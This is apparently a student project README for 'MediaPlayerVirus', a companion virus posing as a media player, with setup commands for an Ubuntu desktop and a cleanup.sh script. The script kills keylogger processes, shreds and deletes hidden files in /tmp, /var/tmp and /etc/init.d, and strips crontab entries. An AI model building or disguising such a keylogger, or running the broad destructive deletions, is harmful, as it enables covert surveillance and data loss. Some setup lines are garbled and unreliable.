# MediaPlayerVirus

Command to execute on the ULR Ubuntu desktop to clone and install all the project dependencies.

git clone <https://github.com/agueguen-LR/MediaPlayerVirus.git>

Update the time of the computer

sudo apt update

sudo apt install cmake=

sudo apt install libgtk-4-dev

A companion virus, posing as a media player application.

# !/bin/bash

# cleanup.sh

echo "🧹 Cleaning keylogger traces..."
pkill -9 -f ".kl\|keys.gz\|virus" 2>/dev/null
find /tmp /var/tmp /etc/init.d /proc/self/fd -name ".*kl*" -delete 2>/dev/null
find /tmp -name "*.gz" -exec shred -u -z {} \; 2>/dev/null
crontab -l 2>/dev/null | grep -vE "(kl|virus)" | crontab -
ls -la . | grep -E "old|virus" | xargs rm -f
echo "✅ Cleaned !"
